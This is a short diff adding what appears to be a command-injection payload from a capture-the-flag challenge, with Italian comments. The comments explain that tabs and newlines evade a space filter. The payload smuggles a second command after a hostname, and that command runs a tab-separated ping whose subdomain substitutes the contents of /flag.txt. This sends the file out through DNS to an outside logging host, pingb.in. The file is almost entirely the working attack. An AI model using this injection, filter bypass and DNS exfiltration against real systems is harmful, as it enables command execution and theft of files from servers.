@@ -1,0 +1,4 @@
+# Notare l'uso di Tabs e Newline perché non sono filtrati come gli spazi.
+# <randomstring> è presentata nella URL di 'pingb.in'.
+www.google.com
+ping	-c	1	<randomstring>.`cat</flag.txt`.ns.pingb.in
